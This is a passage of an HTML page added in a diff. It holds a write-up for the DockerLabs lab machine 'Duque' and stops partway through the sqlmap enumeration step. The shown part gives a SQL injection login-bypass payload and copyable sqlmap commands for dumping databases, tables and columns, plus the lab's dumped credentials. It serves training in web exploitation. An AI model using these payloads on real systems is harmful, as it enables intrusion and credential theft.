@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1024">
+    <title>Duque — Dockerlabs Write-up | FLRS</title>
+    <meta name="description"
+        content="Write-up for the Duque machine on DockerLabs — Difficulty: Easy. SQL Injection → SQLMap → IDOR Exploitation → Credential Disclosure.">
+    <meta name="author" content="Francisco Luis Rivero Sánchez">
+    <meta name="theme-color" content="#0a0a0a">
+
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico">
+    <link rel="apple-touch-icon" href="../../assets/apple-touch-icon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=Inter:ital,wght@0,300;0,400;0,500;1,300&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <style>
+        html, body { max-width: 100%; overflow-x: clip; }
+        :root {
+            --bg: #050810; --bg-2: #07090E; --bg-3: #0E1522;
+            --surface: rgba(10,14,24,0.82); --border: rgba(0,210,255,0.08);
+            --border-h: rgba(0,210,255,0.28); --accent: #00D2FF;
+            --accent-dim: rgba(0,210,255,0.09); --accent-2: #6E5BFF;
+            --text: #D2E6F6; --text-2: #AABCCE; --text-3: #546878;
+            --ok: #00ff88; --warn: #ffaa00; --danger: #ff5050;
+            --font-d: 'Syne', sans-serif; --font-b: 'Inter', sans-serif;
+            --font-m: 'JetBrains Mono', monospace;
+            --glow: 0 0 35px rgba(0,210,255,0.18);
+            --glow-sm: 0 0 16px rgba(0,210,255,0.12);
+            --r: 10px; --ease: cubic-bezier(0.25,0.46,0.45,0.94);
+        }
+        *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+        html { scroll-behavior: smooth; }
+        body { background:var(--bg); color:var(--text); font-family:var(--font-b); font-size:16px; line-height:1.7; font-weight:300; overflow-x:clip; }
+        body::before { content:''; position:fixed; inset:0; background-image:radial-gradient(circle,rgba(0,210,255,0.10) 1px,transparent 1px); background-size:44px 44px; pointer-events:none; z-index:0; }
+        body::after { content:''; position:fixed; width:700px; height:700px; border-radius:50%; background:radial-gradient(circle,rgba(0,210,255,0.04) 0%,transparent 65%); top:-280px; right:-280px; pointer-events:none; z-index:0; }
+        .progress-container { position:fixed; top:0; left:0; width:100%; height:2px; z-index:300; }
+        .progress-bar { height:100%; background:var(--accent); width:0%; transition:width .1s ease; box-shadow:var(--glow-sm); }
+        nav { position:fixed; inset:0 0 auto 0; z-index:200; padding:1.4rem 4.5rem; display:flex; justify-content:space-between; align-items:center; backdrop-filter:blur(22px) saturate(180%); -webkit-backdrop-filter:blur(22px) saturate(180%); background:rgba(5,8,16,0.72); border-bottom:1px solid var(--border); transition:border-color .3s; }
+        .nav-logo { font-family:var(--font-d); font-size:1.05rem; font-weight:800; letter-spacing:-0.02em; color:var(--text); text-decoration:none; }
+        .nav-logo em { font-style:normal; color:var(--accent); }
+        .nav-back { font-family:var(--font-m); font-size:0.72rem; color:var(--text-2); text-decoration:none; letter-spacing:0.1em; text-transform:uppercase; transition:color .2s var(--ease); display:flex; align-items:center; gap:0.4rem; }
+        .nav-back:hover { color:var(--accent); }
+        .writeup-hero { position:relative; z-index:1; min-height:50vh; display:flex; align-items:flex-end; padding:9rem 5.5rem 4rem; border-bottom:1px solid var(--border); overflow:hidden; }
+        .hero-glow-bg { position:absolute; inset:0; pointer-events:none; background:radial-gradient(ellipse 60% 80% at 10% 60%,rgba(110,91,255,0.05) 0%,transparent 70%); }
+        .writeup-hero-content { position:relative; z-index:2; max-width:900px; }
+        .breadcrumb { font-family:var(--font-m); font-size:0.68rem; color:var(--text-3); letter-spacing:0.1em; margin-bottom:1.2rem; opacity:0; animation:fadeUp .45s var(--ease) .05s forwards; }
+        .breadcrumb a { color:var(--text-3); text-decoration:none; transition:color .2s; }
+        .breadcrumb a:hover { color:var(--accent); }
+        .breadcrumb .sep { margin:0 .5rem; }
+        .breadcrumb .current { color:var(--accent); }
+        .writeup-title-h { font-family:var(--font-d); font-size:clamp(3rem,7vw,5.5rem); font-weight:800; letter-spacing:-0.045em; line-height:0.92; margin-bottom:1rem; background:linear-gradient(135deg,#E6F0F8 0%,#7DAFCC 60%,var(--accent) 100%); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; opacity:0; animation:fadeUp .65s var(--ease) .2s forwards; }
+        .writeup-subtitle { font-family:var(--font-m); font-size:0.8rem; color:var(--text-2); letter-spacing:0.05em; margin-bottom:1.8rem; opacity:0; animation:fadeUp .65s var(--ease) .35s forwards; }
+        .writeup-meta { display:flex; flex-wrap:wrap; gap:0.7rem; align-items:center; opacity:0; animation:fadeUp .65s var(--ease) .5s forwards; }
+        .meta-badge { font-family:var(--font-m); font-size:0.65rem; letter-spacing:0.1em; text-transform:uppercase; padding:0.28rem 0.8rem; border-radius:4px; border:1px solid; }
+        .badge-easy { color:var(--ok); border-color:rgba(0,255,136,0.3); background:rgba(0,255,136,0.05); }
+        .badge-docker { color:var(--accent); border-color:rgba(0,210,255,0.25); background:var(--accent-dim); }
+        .badge-linux { color:var(--ok); border-color:rgba(0,255,136,0.2); background:rgba(0,255,136,0.04); }
+        .badge-web { color:var(--warn); border-color:rgba(255,170,0,0.25); background:rgba(255,170,0,0.04); }
+        .badge-sqli { color:var(--danger); border-color:rgba(255,80,80,0.25); background:rgba(255,80,80,0.04); }
+        .badge-idor { color:#c44dff; border-color:rgba(196,77,255,0.25); background:rgba(196,77,255,0.04); }
+        .meta-date { font-family:var(--font-m); font-size:0.65rem; color:var(--text-3); padding-left:0.5rem; }
+        .writeup-layout { position:relative; z-index:1; display:grid; grid-template-columns:1fr 260px; align-items:start; gap:3.5rem; max-width:1080px; margin:0 auto; padding:4rem 2.5rem; }
+        .sidebar { position:sticky; top:5.5rem; height:fit-content; align-self:start; order:2; }
+        .sidebar-box { border:1px solid var(--border); border-radius:var(--r); padding:1.4rem; background:var(--surface); backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px); margin-bottom:1.2rem; }
+        .sidebar-title { font-family:var(--font-m); font-size:0.6rem; color:var(--accent); letter-spacing:0.2em; text-transform:uppercase; margin-bottom:1rem; }
+        .toc-list { list-style:none; display:flex; flex-direction:column; gap:0.2rem; }
+        .toc-list a { font-family:var(--font-m); font-size:0.68rem; color:var(--text-3); text-decoration:none; letter-spacing:0.04em; transition:all .2s; display:block; padding:0.3rem 0.75rem; border-left:2px solid transparent; border-radius:0 4px 4px 0; }
+        .toc-list a:hover, .toc-list a.active { color:var(--accent); border-left-color:var(--accent); background:var(--accent-dim); }
+        .info-row { display:flex; justify-content:space-between; align-items:center; margin-bottom:0.7rem; }
+        .info-row:last-child { margin-bottom:0; }
+        .info-label { font-family:var(--font-m); font-size:0.62rem; color:var(--text-3); letter-spacing:0.05em; }
+        .info-val { font-family:var(--font-m); font-size:0.7rem; }
+        .val-accent { color:var(--accent); } .val-ok { color:var(--ok); } .val-warn { color:var(--warn); } .val-danger { color:var(--danger); }
+        .attack-path { display:flex; flex-direction:column; gap:0; }
+        .ap-item { display:flex; align-items:flex-start; gap:0.8rem; padding:0.45rem 0; }
+        .ap-dot { width:7px; height:7px; background:var(--accent); border-radius:50%; margin-top:5px; flex-shrink:0; box-shadow:0 0 6px rgba(0,210,255,0.6); }
+        .ap-line { width:1px; height:14px; background:var(--border); margin:0 3px; }
+        .ap-text { font-family:var(--font-m); font-size:0.63rem; color:var(--text-3); line-height:1.6; }
+        .ap-text span { color:var(--accent); }
+        .writeup-content { min-width:0; order:1; }
+        .section { margin-bottom:4rem; opacity:0; transform:translateY(22px); transition:opacity .6s var(--ease),transform .6s var(--ease); }
+        .section.visible { opacity:1; transform:none; }
+        .section-label { font-family:var(--font-m); font-size:0.65rem; color:var(--accent); letter-spacing:0.22em; text-transform:uppercase; margin-bottom:0.4rem; }
+        .section-title { font-family:var(--font-d); font-size:1.6rem; font-weight:800; letter-spacing:-0.02em; color:var(--text); margin-bottom:0.5rem; }
+        .section-line { width:36px; height:2px; background:var(--accent); margin-bottom:2rem; opacity:0.6; }
+        hr.divider { border:none; border-top:1px solid var(--border); margin:0 0 4rem 0; }
+        .prose p { font-size:1rem; line-height:2.0; color:var(--text-2); margin-bottom:1rem; }
+        .prose p strong { color:var(--text); font-weight:500; }
+        .prose p .hl { color:var(--accent); } .prose p .hl-ok { color:var(--ok); } .prose p .hl-warn { color:var(--warn); } .prose p .hl-bad { color:var(--danger); } .prose p .hl-pur { color:var(--accent-2); }
+        .prose p code { font-family:var(--font-m); font-size:0.85em; color:var(--accent); background:var(--bg-3); padding:0.05rem 0.35rem; border-radius:3px; }
+        .step-marker { display:flex; align-items:center; gap:1rem; margin-bottom:1rem; margin-top:2.2rem; }
+        .step-num { font-family:var(--font-m); font-size:0.62rem; font-weight:500; color:var(--bg); background:var(--accent); width:26px; height:26px; border-radius:4px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+        .step-title { font-family:var(--font-m); font-size:0.75rem; color:var(--accent); letter-spacing:0.1em; text-transform:uppercase; }
+        .cmd-block { background:var(--bg-3); border:1px solid var(--border); border-left:3px solid var(--accent); border-radius:0 var(--r) var(--r) 0; padding:1rem 1.2rem; margin:1rem 0; font-family:var(--font-m); font-size:0.8rem; overflow-x:auto; position:relative; line-height:1.85; }
+        .cmd-label { position:absolute; top:0.5rem; right:4.5rem; font-size:0.58rem; color:var(--text-3); letter-spacing:0.12em; text-transform:uppercase; }
+        .cmd-block .prompt { color:var(--accent); user-select:none; }
+        .cmd-block .cmd { color:var(--text); } .cmd-block .flag { color:var(--accent-2); } .cmd-block .arg { color:var(--warn); } .cmd-block .comment { color:var(--text-3); font-size:0.73rem; }
+        .copy-btn { position:absolute; top:0.5rem; right:0.8rem; background:var(--bg-2); border:1px solid var(--border); color:var(--text-3); font-family:var(--font-m); font-size:0.6rem; padding:0.15rem 0.5rem; letter-spacing:0.08em; cursor:pointer; opacity:0; transition:opacity .2s,background .2s,color .2s; border-radius:3px; }
+        .cmd-block:hover .copy-btn { opacity:1; }
+        .copy-btn:hover { background:var(--accent); color:#000; border-color:var(--accent); }
+        .copy-btn.copied { background:var(--ok); color:#000; border-color:var(--ok); opacity:1; }
+        .output-block { background:#030508; border:1px solid var(--border); border-radius:var(--r); padding:1rem 1.2rem; margin:0.5rem 0 1.5rem; font-family:var(--font-m); font-size:0.76rem; line-height:1.9; color:var(--text-2); overflow-x:auto; }
+        .o-accent { color:var(--accent); } .o-ok { color:var(--ok); } .o-warn { color:var(--warn); } .o-bad { color:var(--danger); } .o-white { color:var(--text); font-weight:500; }
+        .info-box { border:1px solid rgba(0,210,255,0.18); background:rgba(0,210,255,0.04); border-radius:var(--r); padding:1.2rem 1.5rem; margin:1.2rem 0; }
+        .info-box-title { font-family:var(--font-m); font-size:0.62rem; color:var(--accent); letter-spacing:0.2em; text-transform:uppercase; margin-bottom:0.6rem; }
+        .info-box p { font-family:var(--font-m); font-size:0.76rem; color:var(--text-2); line-height:1.85; }
+        .info-box p strong { color:var(--accent); }
+        .warn-box { border:1px solid rgba(255,170,0,0.22); background:rgba(255,170,0,0.04); border-radius:var(--r); padding:1.2rem 1.5rem; margin:1.2rem 0; }
+        .warn-box-title { font-family:var(--font-m); font-size:0.62rem; color:var(--warn); letter-spacing:0.2em; text-transform:uppercase; margin-bottom:0.6rem; }
+        .warn-box p { font-family:var(--font-m); font-size:0.76rem; color:var(--text-2); line-height:1.85; }
+        .warn-box p strong { color:var(--warn); }
+        .danger-box { border:1px solid rgba(255,80,80,0.22); background:rgba(255,80,80,0.04); border-radius:var(--r); padding:1.2rem 1.5rem; margin:1.2rem 0; }
+        .danger-box-title { font-family:var(--font-m); font-size:0.62rem; color:var(--danger); letter-spacing:0.2em; text-transform:uppercase; margin-bottom:0.6rem; }
+        .danger-box p { font-family:var(--font-m); font-size:0.76rem; color:var(--text-2); line-height:1.85; }
+        .danger-box p strong { color:var(--danger); }
+        .vuln-table { width:100%; border-collapse:collapse; margin:1.5rem 0; }
+        .vuln-table th, .vuln-table td { font-family:var(--font-m); font-size:0.7rem; padding:0.75rem 1rem; text-align:left; border-bottom:1px solid var(--border); }
+        .vuln-table th { color:var(--accent); letter-spacing:0.1em; text-transform:uppercase; font-weight:500; border-bottom-color:rgba(0,210,255,0.2); }
+        .vuln-table td { color:var(--text-2); } .vuln-table td:first-child { color:var(--accent); }
+        .cmd-ref-grid { display:grid; grid-template-columns:1fr 1fr; gap:1.2rem; margin-top:1.5rem; }
+        .cmd-ref-card { border:1px solid var(--border); border-radius:var(--r); background:var(--surface); padding:1.5rem; transition:border-color .3s; }
+        .cmd-ref-card:hover { border-color:rgba(0,210,255,0.22); }
+        .cmd-ref-name { font-family:var(--font-m); font-size:0.9rem; color:var(--accent); margin-bottom:0.5rem; letter-spacing:0.05em; }
+        .cmd-ref-syntax { font-family:var(--font-m); font-size:0.72rem; color:var(--ok); background:var(--bg-3); padding:0.4rem 0.7rem; margin-bottom:0.8rem; display:inline-block; border-radius:4px; }
+        .cmd-ref-desc { font-size:0.88rem; color:var(--text-2); line-height:1.8; margin-bottom:0.8rem; }
+        .cmd-ref-flags { list-style:none; display:flex; flex-direction:column; gap:0.3rem; }
+        .cmd-ref-flags li { font-family:var(--font-m); font-size:0.7rem; color:var(--text-3); }
+        .cmd-ref-flags li code { color:var(--accent); }
+        .glos-grid { display:flex; flex-direction:column; gap:1rem; }
+        .glos-card { border:1px solid var(--border); border-radius:var(--r); padding:1.4rem; background:var(--surface); }
+        .glos-term { font-family:var(--font-m); font-size:0.75rem; color:var(--accent); letter-spacing:0.06em; margin-bottom:0.6rem; }
+        .glos-def { font-size:0.85rem; color:var(--text-2); line-height:1.9; }
+        .glos-def strong { color:var(--text); font-weight:500; }
+        .glos-def code { font-family:var(--font-m); font-size:0.78rem; color:var(--accent); background:var(--bg-3); padding:0.05rem 0.35rem; border-radius:3px; }
+        .toast { position:fixed; bottom:24px; right:24px; background:var(--accent); color:#000; padding:0.65rem 1.3rem; font-family:var(--font-m); font-size:0.72rem; letter-spacing:0.1em; border-radius:5px; opacity:0; transform:translateY(8px); transition:opacity .25s,transform .25s; pointer-events:none; z-index:10000; }
+        .toast.show { opacity:1; transform:translateY(0); }
+        footer { position:relative; z-index:1; text-align:center; padding:2rem; border-top:1px solid var(--border); font-family:var(--font-m); font-size:0.67rem; color:var(--text-3); letter-spacing:0.1em; }
+        footer em { font-style:normal; color:var(--accent); }
+        @keyframes fadeUp { from { opacity:0; transform:translateY(18px); } to { opacity:1; transform:translateY(0); } }
+        @media (max-width:860px) {
+            nav { padding:1.2rem 1.75rem; }
+            .writeup-hero { padding:7rem 1.75rem 3rem; }
+            .writeup-layout { grid-template-columns:1fr; padding:3rem 1.75rem; }
+            .sidebar { position:static; order:-1; }
+            .cmd-ref-grid { grid-template-columns:1fr; }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<nav id="nav">
+    <a href="../../" class="nav-logo">franlrs<em>.</em></a>
+    <a href="../../writeups" class="nav-back">← Write-ups</a>
+</nav>
+
+<div class="writeup-hero">
+    <div class="hero-glow-bg"></div>
+    <div class="writeup-hero-content">
+        <div class="breadcrumb">
+            <a href="../../">Portfolio </a><span class="sep">/</span>
+            <a href="../../writeups">Write-ups </a><span class="sep">/</span>
+            <span class="current">Duque</span>
+        </div>
+        <h1 class="writeup-title-h">Duque.</h1>
+        <p class="writeup-subtitle">DockerLabs · SQL Injection → SQLMap → IDOR Exploitation → Credential Disclosure</p>
+        <div class="writeup-meta">
+            <span class="meta-badge badge-easy">Easy</span>
+            <span class="meta-badge badge-docker">Dockerlabs</span>
+            <span class="meta-badge badge-linux">Linux</span>
+            <span class="meta-badge badge-web">Web</span>
+            <span class="meta-badge badge-sqli">SQL Injection</span>
+            <span class="meta-badge badge-idor">IDOR</span>
+            <span class="meta-date">May 2026</span>
+        </div>
+    </div>
+</div>
+
+<div class="writeup-layout">
+
+    <aside class="sidebar">
+        <div class="sidebar-box">
+            <p class="sidebar-title">// Machine Info</p>
+            <div class="info-row"><span class="info-label">Platform</span><span class="info-val val-accent">Dockerlabs</span></div>
+            <div class="info-row"><span class="info-label">Difficulty</span><span class="info-val val-ok">Easy</span></div>
+            <div class="info-row"><span class="info-label">OS</span><span class="info-val val-ok">Linux</span></div>
+            <div class="info-row"><span class="info-label">IP</span><span class="info-val val-accent">172.17.0.2</span></div>
+            <div class="info-row"><span class="info-label">Services</span><span class="info-val" style="color:var(--text-2)">80</span></div>
+            <div class="info-row"><span class="info-label">Techniques</span><span class="info-val val-danger">SQLi · IDOR</span></div>
+        </div>
+
+        <div class="sidebar-box">
+            <p class="sidebar-title">// Contents</p>
+            <ul class="toc-list">
+                <li><a href="#summary">01 — Summary</a></li>
+                <li><a href="#recon">02 — Reconnaissance</a></li>
+                <li><a href="#sqli">03 — SQL Injection</a></li>
+                <li><a href="#idor">04 — IDOR Exploitation</a></li>
+                <li><a href="#cmdref">05 — Command Reference</a></li>
+                <li><a href="#glossary">06 — Glossary</a></li>
+            </ul>
+        </div>
+
+        <div class="sidebar-box">
+            <p class="sidebar-title">// Attack Path</p>
+            <div class="attack-path">
+                <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Gobuster → <span>/bills/</span> found</div></div>
+                <div class="ap-line"></div>
+                <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SQL Injection</span> → auth bypass</div></div>
+                <div class="ap-line"></div>
+                <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SQLMap</span> → credentials dumped</div></div>
+                <div class="ap-line"></div>
+                <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Login as <span>admin</span> → IDOR pattern</div></div>
+                <div class="ap-line"></div>
+                <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>fuzzer.py</span> → ID <span>xyc724</span></div></div>
+                <div class="ap-line"></div>
+                <div class="ap-item">
+                    <div class="ap-dot" style="background:var(--ok);box-shadow:0 0 6px var(--ok)"></div>
+                    <div class="ap-text"><span style="color:var(--ok)">duque:duquelaje81029557! ✓</span></div>
+                </div>
+            </div>
+        </div>
+    </aside>
+
+    <main class="writeup-content" id="main-content">
+
+        <!-- 01 SUMMARY -->
+        <div class="section" id="summary">
+            <p class="section-label">// 01</p>
+            <h2 class="section-title">Summary</h2>
+            <div class="section-line"></div>
+            <div class="prose">
+                <p><strong>Duque</strong> is an <span class="hl-ok">Easy</span> difficulty machine from the <span class="hl">DockerLabs</span> platform. It exposes a single web service on <span class="hl">port 80</span> running a custom PHP application that contains a billing panel reachable through directory enumeration.</p>
+                <p>The attack chain combines two classic web vulnerabilities chained together. First, a <span class="hl-bad">SQL Injection</span> in the login form of the <code>/bills/</code> endpoint is exploited both manually — to bypass authentication — and automatically with <strong>SQLMap</strong>, which dumps the entire <code>register</code> database and retrieves plaintext credentials for three users, including <span class="hl-bad">admin:admin123</span>.</p>
+                <p>Once authenticated as admin, the application exposes invoice records through a predictable URL pattern (<code>panel.php?id=xy****</code>), which is vulnerable to <span class="hl-pur">Insecure Direct Object Reference (IDOR)</span>. A custom Python fuzzer iterates through all possible ID combinations and identifies a hidden invoice containing the credentials of the system user <span class="hl-ok">duque</span>, completing the compromise.</p>
+            </div>
+            <table class="vuln-table">
+                <thead><tr><th>Phase</th><th>Technique / Tool</th><th>Result</th></tr></thead>
+                <tbody>
+                    <tr><td>Deploy</td><td>auto_deploy.sh</td><td>Machine active at 172.17.0.2</td></tr>
+                    <tr><td>Reconnaissance</td><td>Gobuster dir — directory-list-lowercase-2.3-medium</td><td>/bills/ endpoint discovered</td></tr>
+                    <tr><td>Authentication bypass</td><td>Manual SQL Injection — 'or 1=1-- -</td><td>Access to /bills/ login panel</td></tr>
+                    <tr><td>Database enumeration</td><td>BurpSuite (request capture) + SQLMap --dbs</td><td>5 databases found — register identified</td></tr>
+                    <tr><td>Credential extraction</td><td>SQLMap -D register -T users --dump</td><td>3 users dumped — admin:admin123 retrieved</td></tr>
+                    <tr><td>IDOR discovery</td><td>Panel URL pattern analysis — BurpSuite repeater</td><td>id=xy**** pattern identified</td></tr>
+                    <tr><td>IDOR exploitation</td><td>Custom fuzzer.py — response-length filtering</td><td>ID xyc724 — sensitive data alert triggered</td></tr>
+                    <tr><td>Credential disclosure</td><td>fuzzer.py result — invoice xyc724</td><td>duque:duquelaje81029557! obtained</td></tr>
+                </tbody>
+            </table>
+            <div class="info-box">
+                <p class="info-box-title">// Vulnerability chain — SQLi + IDOR</p>
+                <p>This machine illustrates a common real-world pattern: a <strong>SQL Injection</strong> grants initial access to an authenticated area, while a secondary vulnerability — <strong>IDOR</strong> — then leaks data the attacker was not intended to access. Neither vulnerability alone reveals the final credentials; it is their sequential exploitation that completes the compromise. This chain underscores the importance of <strong>defence in depth</strong>: fixing one vulnerability is not sufficient if others remain unaddressed.</p>
+            </div>
+        </div>
+
+        <hr class="divider">
+
+        <!-- 02 RECONNAISSANCE -->
+        <div class="section" id="recon">
+            <p class="section-label">// 02</p>
+            <h2 class="section-title">Reconnaissance</h2>
+            <div class="section-line"></div>
+
+            <div class="step-marker"><div class="step-num">1</div><span class="step-title">Deploy the machine</span></div>
+            <div class="prose">
+                <p>We deploy the vulnerable container using the <strong>auto_deploy.sh</strong> script provided by DockerLabs, passing the <span class="hl">duque.tar</span> archive as argument. The script pulls and starts the Docker image, assigns the internal IP <strong>172.17.0.2</strong>, and keeps it running until <span class="hl">Ctrl+C</span> is pressed. <strong>sudo</strong> is required to manage Docker network interfaces.</p>
+            </div>
+            <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh duque.tar">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                <span class="cmd-label">DEPLOY</span>
+                <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">duque.tar</span></span></div>
+            </div>
+            <div class="output-block">
+                <div>Deploying vulnerable machine, please wait.</div>
+                <div>&nbsp;</div>
+                <div class="o-ok">Machine deployed, its IP address is ——> <strong>172.17.0.2</strong></div>
+                <div class="o-bad">Press Ctrl+C when done to remove the machine</div>
+            </div>
+
+            <div class="step-marker"><div class="step-num">2</div><span class="step-title">Directory enumeration — Gobuster</span></div>
+            <div class="prose">
+                <p>With the machine live, we run <strong>Gobuster</strong> in <code>dir</code> mode against port 80 to discover hidden directories and endpoints. We use the <span class="hl-pur">directory-list-lowercase-2.3-medium.txt</span> wordlist from DirBuster — a solid general-purpose list covering the most common web paths. Gobuster sends HTTP GET requests for each word in the list and reports back any response that is not a 404, allowing us to map the application's structure before touching any functionality.</p>
+            </div>
+            <div class="cmd-block" data-cmd="gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                <span class="cmd-label">GOBUSTER</span>
+                <div><span class="prompt">$ </span><span class="cmd">gobuster dir <span class="flag">-u</span> <span class="arg">http://172.17.0.2</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></span></div>
+            </div>
+            <div class="output-block">
+                <div>===============================================================</div>
+                <div>Gobuster v3.6 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</div>
+                <div>===============================================================</div>
+                <div>[+] Url: http://172.17.0.2 | Method: GET | Threads: 10</div>
+                <div>===============================================================</div>
+                <div class="o-ok">/bills&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 301) [Size: 312] [--> http://172.17.0.2/bills/]</div>
+                <div>===============================================================</div>
+            </div>
+            <div class="danger-box">
+                <p class="danger-box-title">// Critical finding</p>
+                <p>Gobuster reveals <strong>/bills/</strong> — a billing panel endpoint not linked from the main page. This hidden application surface is the core attack vector for the entire machine. The 301 redirect confirms the directory exists and is actively serving content.</p>
+            </div>
+        </div>
+
+        <hr class="divider">
+
+        <!-- 03 SQL INJECTION -->
+        <div class="section" id="sqli">
+            <p class="section-label">// 03</p>
+            <h2 class="section-title">SQL Injection</h2>
+            <div class="section-line"></div>
+
+            <div class="step-marker"><div class="step-num">3</div><span class="step-title">Manual SQL Injection — authentication bypass</span></div>
+            <div class="prose">
+                <p>Navigating to <code>http://172.17.0.2/bills/</code> presents a login form. After fuzzing the input fields, we identify a classic <span class="hl-bad">SQL Injection</span> vulnerability in the username field. The payload <code>'or 1=1-- -</code> causes the backend SQL query to always evaluate as true, completely bypassing the authentication check and granting access to the panel without valid credentials.</p>
+                <p>The payload works as follows: the leading single quote <code>'</code> closes the string context in the SQL query, <code>or 1=1</code> appends a condition that is always true, and <code>-- -</code> comments out the rest of the original query — including the password check — making the WHERE clause always return at least one row and thus authenticate successfully.</p>
+            </div>
+            <div class="cmd-block" data-cmd="'or 1=1-- -">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                <span class="cmd-label">SQLI PAYLOAD</span>
+                <div><span class="prompt">username: </span><span class="cmd"><span class="arg">'or 1=1-- -</span></span></div>
+                <div><span class="prompt">password: </span><span class="cmd"><span class="arg">[anything]</span></span></div>
+            </div>
+            <div class="output-block">
+                <div class="o-ok">→ Authentication bypassed. Redirected to /bills/panel.php</div>
+            </div>
+
+            <div class="step-marker"><div class="step-num">4</div><span class="step-title">Capture POST request — BurpSuite</span></div>
+            <div class="prose">
+                <p>To automate the injection with <strong>SQLMap</strong>, we first need the raw HTTP request. We configure our browser to route traffic through <strong>BurpSuite</strong> acting as an HTTP proxy, then submit the login form with any test credentials. BurpSuite intercepts the POST request to <code>/bills/</code>, which we save to a file (<span class="hl">request.txt</span>). This file will be passed to SQLMap via the <code>-r</code> flag, replicating the exact headers, cookies, and body of a legitimate browser request — including the session cookie and CSRF token — to ensure injection accuracy.</p>
+            </div>
+            <div class="output-block">
+                <div class="o-white">POST /bills/ HTTP/1.1</div>
+                <div>Host: 172.17.0.2</div>
+                <div>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0</div>
+                <div>Content-Type: application/x-www-form-urlencoded</div>
+                <div>Cookie: <span class="o-warn">wp-settings-time-1=1776015782; csrftoken=EjLf807KTLwPCpe1ywwXLNTQe08SFQfg; PHPSESSID=im7874jb6qsmcg8j68fba8lbng</span></div>
+                <div>&nbsp;</div>
+                <div class="o-accent">username=fran&amp;password=fran1234</div>
+            </div>
+
+            <div class="step-marker"><div class="step-num">5</div><span class="step-title">Enumerate databases — SQLMap --dbs</span></div>
+            <div class="prose">
+                <p>With the captured request saved as <span class="hl">request.txt</span>, we feed it to <strong>SQLMap</strong> using <span class="hl-pur">-r</span>. The <span class="hl-pur">--dbs</span> flag instructs SQLMap to enumerate all accessible databases on the server, and <span class="hl-pur">--batch</span> accepts all default prompts non-interactively. SQLMap will automatically detect the injection point within the request body and test multiple payloads to extract database information.</p>
+            </div>
+            <div class="cmd-block" data-cmd="sqlmap -r request.txt --dbs --batch">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                <span class="cmd-label">SQLMAP</span>
+                <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">--dbs</span> <span class="flag">--batch</span></span></div>
+            </div>
+            <div class="output-block">
+                <div class="o-accent">[INFO] the back-end DBMS is MySQL</div>
+                <div>[INFO] fetching database names</div>
+                <div>&nbsp;</div>
+                <div class="o-white">available databases [5]:</div>
+                <div>[*] information_schema</div>
+                <div>[*] mysql</div>
+                <div>[*] performance_schema</div>
+                <div class="o-ok">[*] register</div>
+                <div>[*] sys</div>
+            </div>
+            <div class="info-box">
+                <p class="info-box-title">// Key finding</p>
+                <p>Among the standard MySQL system databases, the <strong>register</strong> database stands out as an application-specific store. This is the target for further enumeration, as it is likely to contain user account information.</p>
+            </div>
+
+            <div class="step-marker"><div class="step-num">6</div><span class="step-title">Enumerate tables — SQLMap -D register --tables</span></div>
+            <div class="prose">
+                <p>We narrow down the extraction to the <span class="hl">register</span> database using <span class="hl-pur">-D register</span> and retrieve its table list with <span class="hl-pur">--tables</span>. This reveals a single table named <span class="hl-bad">users</span> — almost certainly the credential store for the application.</p>
+            </div>
+            <div class="cmd-block" data-cmd="sqlmap -r request.txt -D register --tables --batch">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                <span class="cmd-label">SQLMAP TABLES</span>
+                <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">register</span> <span class="flag">--tables</span> <span class="flag">--batch</span></span></div>
+            </div>
+            <div class="output-block">
+                <div>Database: <span class="o-accent">register</span></div>
+                <div>[1 table]</div>
+                <div>+-------+</div>
+                <div class="o-ok">| users |</div>
+                <div>+-------+</div>
+            </div>
+
+            <div class="step-marker"><div class="step-num">7</div><span class="step-title">Enumerate columns — SQLMap -T users --columns</span></div>
+            <div class="prose">
+                <p>We add <span class="hl-pur">-T users</span> and <span class="hl-pur">--columns</span> to inspect the schema of the <code>users</code> table. The structure reveals three columns: <span class="hl">id</span>, <span class="hl">username</span>, and <span class="hl-bad">passwd</span>, stored as plain <code>varchar(50)</code> — meaning credentials are not hashed, making their extraction immediately actionable.</p>
+            </div>
+            <div class="cmd-block" data-cmd="sqlmap -r request.txt -D register -T users --columns --batch">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
